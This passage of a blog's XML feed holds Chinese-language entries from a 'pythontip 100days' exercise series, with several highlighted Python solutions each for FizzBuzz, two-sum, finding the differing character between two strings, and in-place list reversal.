curr_node            curr_node <span class="token operator">=</span> curr_node<span class="token punctuation">.</span><span class="token builtin">next</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>     <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>head <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>head<span class="token punctuation">.</span>data <span class="token operator">==</span> data<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>head <span class="token operator">=</span> self<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token builtin">next</span>            <span class="token keyword">return</span>        prev_node <span class="token operator">=</span> self<span class="token punctuation">.</span>head        curr_node <span class="token operator">=</span> self<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token builtin">next</span>        <span class="token keyword">while</span> curr_node <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> curr_node<span class="token punctuation">.</span>data <span class="token operator">==</span> data<span class="token punctuation">:</span>                prev_node<span class="token punctuation">.</span><span class="token builtin">next</span> <span class="token operator">=</span> curr_node<span class="token punctuation">.</span><span class="token builtin">next</span>                <span class="token keyword">return</span>            prev_node <span class="token operator">=</span> curr_node            curr_node <span class="token operator">=</span> curr_node<span class="token punctuation">.</span><span class="token builtin">next</span>                            <span class="token keyword">def</span> <span class="token function">length</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        curr <span class="token operator">=</span> self<span class="token punctuation">.</span>head        counter <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">while</span> curr <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            counter <span class="token operator">+=</span> <span class="token number">1</span>            curr <span class="token operator">=</span> curr<span class="token punctuation">.</span><span class="token builtin">next</span>        <span class="token keyword">return</span> counter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day8</title>
      <link href="//code/python/pythontip-100days-day8/"/>
      <url>//code/python/pythontip-100days-day8/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入一个正整数<code>n</code>,返回一个<code>list</code>,<code>list</code>中的内容为1到n，但是将其中3的倍数替换为’Fizz’,5的倍数替换为’Buzz’,同时为3和5的倍数的替换为’FizzBuzz’</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul><li>15 -&gt;</li></ul><p>[ ‘1’, ‘2’, ‘Fizz’, ‘4’, ‘Buzz’, ‘Fizz’, ‘7’, ‘8’, ‘Fizz’, ‘Buzz’, ‘11’, ‘Fizz’, ‘13’, ‘14’, ‘FizzBuzz’ ]</p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>利用取模运算</li></ol><p><strong>答案</strong></p><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1:"></a>解法1:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fizz_buzz</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> i <span class="token operator">%</span> <span class="token number">5</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            results<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'FizzBuzz'</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> i <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            results<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Fizz'</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> i <span class="token operator">%</span> <span class="token number">5</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            results<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Buzz'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            results<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> results                             <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：1.利用取模运算</p><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fizz_buzz</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    l <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> l<span class="token punctuation">:</span>        <span class="token keyword">if</span> x <span class="token operator">%</span> <span class="token number">15</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            l<span class="token punctuation">[</span>l<span class="token punctuation">.</span>index<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'FizzBuzz'</span>        <span class="token keyword">elif</span> x <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            l<span class="token punctuation">[</span>l<span class="token punctuation">.</span>index<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Fizz'</span>        <span class="token keyword">elif</span> x <span class="token operator">%</span> <span class="token number">5</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            l<span class="token punctuation">[</span>l<span class="token punctuation">.</span>index<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Buzz'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            l<span class="token punctuation">[</span>l<span class="token punctuation">.</span>index<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>  <span class="token comment"># 要把数字转换为str类型</span>    <span class="token keyword">return</span> l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>利用取模运算</li><li>利用index()方法定位元素</li></ol><h3 id="解法3："><a href="#解法3：" class="headerlink" title="解法3："></a>解法3：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fizz_buzz</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    l <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">getfizzbuzz</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> n <span class="token operator">%</span> <span class="token number">15</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'FizzBuzz'</span>        <span class="token keyword">elif</span> n <span class="token operator">%</span> <span class="token number">5</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Buzz'</span>        <span class="token keyword">elif</span> n <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Fizz'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>getfizzbuzz<span class="token punctuation">,</span> l<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(2n)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>利用取模运算</li><li>利用map()方法对迭代对象处理</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python代码测试</title>
      <link href="//python/python-dai-ma-ce-shi/"/>
      <url>//python/python-dai-ma-ce-shi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pytest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day7</title>
      <link href="//code/python/pythontip-100days-day7/"/>
      <url>//code/python/pythontip-100days-day7/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入一个list<code>l</code>和一个整数<code>n</code>,判断<code>l</code>中是否有<strong>两个</strong>元素的和等于<code>n</code></p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul><li>None输入 -&gt; False</li><li>[],3 -&gt; False</li><li>[1,3,5],4 -&gt; True</li><li>[2,3,4,6],11 -&gt; Flase</li></ul><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ul><li>list中元素均为整数</li></ul><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>利用两重循环搜索</li><li>记录已出现过的值</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1:"></a>解法1:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">two_sum</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> l <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> n <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> l<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> l<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> n<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>                               <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n^2)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：1.两重循环搜索</p><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">two_sum</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> l <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> n <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    memo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> l<span class="token punctuation">:</span>        need <span class="token operator">=</span> n <span class="token operator">-</span> x        <span class="token keyword">if</span> memo<span class="token punctuation">.</span>get<span class="token punctuation">(</span>need<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        memo<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>             <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度O(n)</li><li>空间复杂度O(n)</li></ol><p><strong>关键点</strong>:</p><ol><li>利用dict记录出现过的数字，后续直接查找dict即可</li></ol><h3 id="解法3："><a href="#解法3：" class="headerlink" title="解法3："></a>解法3：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">two_sum</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> l <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> n <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> l<span class="token punctuation">:</span>  <span class="token comment"># O(n)</span>        <span class="token triple-quoted-string string">"""            1. 遍历l，判断n-x是否在l中            2. 如果n-x的差不等于x，那么l中存在两数之和等于n            3. 如果n-x的差等于x，那么l中至少存在两个x才能保证l中存在两数之和等于n        """</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> x<span class="token punctuation">)</span> <span class="token keyword">in</span> l <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token number">2</span> <span class="token operator">*</span> x<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">*</span> x <span class="token keyword">and</span> l<span class="token punctuation">.</span>count<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度O(n^2)</li><li>空间复杂度O(n)</li></ol><p><strong>关键点</strong>:</p><ol><li>判断n-x的差是否存在l中，如果n=2x，则判断l中x的数量应该大于等于2</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day6</title>
      <link href="//code/python/pythontip-100days-day6/"/>
      <url>//code/python/pythontip-100days-day6/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入为两个字符串<code>str1</code>,<code>str2</code>。找出两个字符串中不同的字符</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul><li>None输入 -&gt; None</li><li>‘abc’,’abcc’ -&gt; ‘c’</li><li>‘abcd’,’abcde’ -&gt; ‘e’</li><li>‘aaabbcdd’,’abdbacade’ -&gt; ‘e’</li></ul><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ul><li>两个字符串中<strong>只有唯一一个</strong>字符不同</li><li>所有字符均为ascii</li></ul><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>统计每个字符出现的次数</li><li>利用异或运算</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1:"></a>解法1:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">find_diff</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> str1 <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> str2 <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    count <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> str1<span class="token punctuation">:</span>        count<span class="token punctuation">[</span>char<span class="token punctuation">]</span> <span class="token operator">=</span> count<span class="token punctuation">.</span>get<span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> str2<span class="token punctuation">:</span>        count<span class="token punctuation">[</span>char<span class="token punctuation">]</span> <span class="token operator">=</span> count<span class="token punctuation">.</span>get<span class="token punctuation">(</span>char<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">for</span> char<span class="token punctuation">,</span>char_count <span class="token keyword">in</span> count<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> char_count <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> char    <span class="token keyword">return</span> <span class="token boolean">None</span>            <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：1.利用dict统计每个字符出现次数</p><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">find_diff</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> str1 <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> str2 <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>     result <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> str1<span class="token punctuation">:</span>        result <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> str2<span class="token punctuation">:</span>        result <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度O(n)</li><li>空间复杂度O(1)</li></ol><p><strong>关键点</strong>:</p><ol><li>利用异或运算<code>xor</code>的性质</li></ol><h3 id="解法3："><a href="#解法3：" class="headerlink" title="解法3："></a>解法3：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">find_diff_reduce</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    1. 将str1、str2中字符的ASCII码生成为列表    2. 使用reduce遍历列表元素，并做异或处理    3. 相同的字符异或后为零，最后的结果转为字符就是不同字符    :param str1:    :param str2:    :return:    """</span>    <span class="token keyword">if</span> str1 <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> str2 <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span>    <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">^</span> y<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> str1 <span class="token operator">+</span> str2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度O(n)</li><li>空间复杂度O(1)</li></ol><p><strong>关键点</strong>:</p><ol><li>利用异或运算<code>xor</code>的性质</li><li>使用reduce的特性，接受两个值，上一次的返回结果和下一个值。第一次会把迭代对象的第一个值作为返回值，接受第一个值和第二个值。</li></ol><h3 id="解法4："><a href="#解法4：" class="headerlink" title="解法4："></a>解法4：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">find_diff_list</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    1. 将str1、str2转为字符串    2. 遍历str1，在str2中删除str1中的元素    3. 将剩下的元素连接成字符串返回    :param str1:    :param str2:    :return:    """</span>    <span class="token keyword">if</span> str1 <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> str2 <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    sl1 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>    sl2 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> sl1<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">in</span> sl2<span class="token punctuation">:</span>            sl2<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>item<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>sl2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度O(n)</li><li>空间复杂度O(4n)</li></ol><p><strong>关键点</strong>:</p><ol><li>利用列表处理字符串，将字符串转换为列表，遍历列表元素，移除遍历的元素</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day5</title>
      <link href="//code/python/pythontip-100days-day5/"/>
      <url>//code/python/pythontip-100days-day5/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>输入一个list,将其翻转，不能够使用新的list，只能在原list上完成。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul><li>None -&gt; None</li><li>[] -&gt; []</li><li>[1,2,3,4] -&gt; [4,3,2,1]</li><li>[‘a’,’c’,’d’,’e’] -&gt; [‘e’,’d’,’c’,’a’]</li></ul><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>1.头尾交换元素</p><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法：1"><a href="#解法：1" class="headerlink" title="解法：1"></a>解法：1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">reverse</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> chars<span class="token punctuation">:</span>        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> chars<span class="token punctuation">[</span>size <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> chars<span class="token punctuation">[</span>size <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> chars                           <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：1.头尾交换元素</p><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">reverse</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> chars <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> chars <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> chars    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span>        result<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> char<span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(n)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>构造一个新的列表，使用insert()插入元素</li></ol><h3 